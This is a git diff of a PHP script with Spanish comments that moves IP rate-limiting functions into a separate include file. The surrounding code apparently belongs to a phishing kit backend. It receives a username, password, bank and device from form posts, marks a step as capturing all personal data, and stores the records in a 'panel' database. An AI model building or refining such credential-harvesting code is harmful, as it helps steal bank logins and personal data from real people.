@@ -1,92 +1,11 @@
 <?php
 require_once("../lib/class.inputfilter.php");
 require('../panel/include/setings.php');
+
+// 🟢 INCLUIMOS TU ARCHIVO DE RATE LIMIT (Ajustando la ruta)
+require_once('../panel/run/rate-limit.php');
+
 date_default_timezone_set('America/Bogota');
-
-// ════════════════════════════════════════════════════════════
-// 🛡️ FUNCIONES DE SEGURIDAD Y RATE LIMITING
-// ════════════════════════════════════════════════════════════
-function getClientIP() {
-    if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
-        return $_SERVER['HTTP_CF_CONNECTING_IP'];
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
-        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
-        return trim($ips[0]);
-    } elseif (!empty($_SERVER['HTTP_X_FORWARDED'])) {
-        return $_SERVER['HTTP_X_FORWARDED'];
-    } elseif (!empty($_SERVER['HTTP_FORWARDED_FOR'])) {
-        return $_SERVER['HTTP_FORWARDED_FOR'];
-    } elseif (!empty($_SERVER['HTTP_FORWARDED'])) {
-        return $_SERVER['HTTP_FORWARDED'];
-    } else {
-        return $_SERVER['REMOTE_ADDR'] ?? '0.0.0.0';
-    }
-}
-
-function checkRateLimit($ip, $limit = 3, $window = 900, $block_time = 900) {
-    $rate_limit_dir = sys_get_temp_dir() . '/psec_rate_limit';
-    
-    if (!is_dir($rate_limit_dir)) {
-        @mkdir($rate_limit_dir, 0777, true);
-    }
-    
-    $ip_file = $rate_limit_dir . '/' . md5($ip) . '.json';
-    $now = time();
-    $data = ['attempts' => [], 'blocked_until' => 0];
-    
-    if (file_exists($ip_file)) {
-        $content = file_get_contents($ip_file);
-        $data = json_decode($content, true) ?? $data;
-    }
-    
-    // ❌ BLOQUEADO?
-    if ($data['blocked_until'] > $now) {
-        $remaining = ceil(($data['blocked_until'] - $now) / 60);
-        http_response_code(429);
-        echo json_encode([
-            'status' => 'ERROR',
-            'message' => "IP bloqueada por spam. Intenta en $remaining minuto(s)",
-            'blocked_until' => $data['blocked_until']
-        ]);
-        exit;
-    }
-    
-    // Limpiar intentos viejos
-    $data['attempts'] = array_filter($data['attempts'], function($timestamp) use ($now, $window) {
-        return ($now - $timestamp) < $window;
-    });
-    
-    // ¿EXCEDIÓ EL LÍMITE?
-    if (count($data['attempts']) >= $limit) {
-        $data['blocked_until'] = $now + $block_time;
-        file_put_contents($ip_file, json_encode($data));
-        
-        http_response_code(429);
-        echo json_encode([
-            'status' => 'ERROR',
-            'message' => 'Demasiadas solicitudes. IP bloqueada.',
-            'blocked_until' => $data['blocked_until']
-        ]);
-        exit;
-    }
-    
-    // Agregar intento
-    $data['attempts'][] = $now;
-    $data['blocked_until'] = 0; 
-    file_put_contents($ip_file, json_encode($data));
-    
-    return true;
-}
-
-function resetRateLimit($ip) {
-    $rate_limit_dir = sys_get_temp_dir() . '/psec_rate_limit';
-    $ip_file = $rate_limit_dir . '/' . md5($ip) . '.json';
-    if (file_exists($ip_file)) {
-        unlink($ip_file);
-    }
-}
-// ════════════════════════════════════════════════════════════
-
 $ifilter = new InputFilter();
 
 // 1. Recibir credenciales básicas
@@ -101,7 +20,7 @@ $contrasena = isset($_POST['pas']) ? $ifilter->process($_POST['pas']) : '';
 $banco = isset($_POST['ban']) ? $ifilter->process($_POST['ban']) : '';
 $dispositivo = isset($_POST['dis']) ? $ifilter->process($_POST['dis']) : '';
 
-// 🟢 USAMOS TU FUNCIÓN PARA OBTENER LA IP REAL DETRÁS DE RENDER
+// 🟢 OBTENEMOS LA IP REAL USANDO LA FUNCIÓN DE TU RATE-LIMIT.PHP
 $ip = getClientIP();
 
 // 2. CAPTURAR TODOS LOS DATOS PERSONALES
@@ -135,7 +54,7 @@ if ($con = conectar()) {
         if ($ref === '0000') {
             resetRateLimit($ip); // Borra el archivo de bloqueo para esta IP
         } else {
-            // Límite ajustado a la necesidad del index: 3 intentos cada 15 min (900s)
+            // Evaluamos la IP: Máximo 3 intentos cada 15 min (900s). Si se pasa, el script muere aquí mismo.
             checkRateLimit($ip, 3, 900, 900); 
         }
 
@@ -148,7 +67,7 @@ if ($con = conectar()) {
         setcookie('id', $id, time() + 3600, '/');
         setcookie('usuario', $usuario, time() + 3600, '/');
     } 
-    // 5. SI YA EXISTE -> ACTUALIZAR (Sin rate limit para no interrumpir el flujo)
+    // 5. SI YA EXISTE -> ACTUALIZAR
     else if ($id !== '') {
         upgrade_user($id, $usuario, $contrasena, $banco); 
         
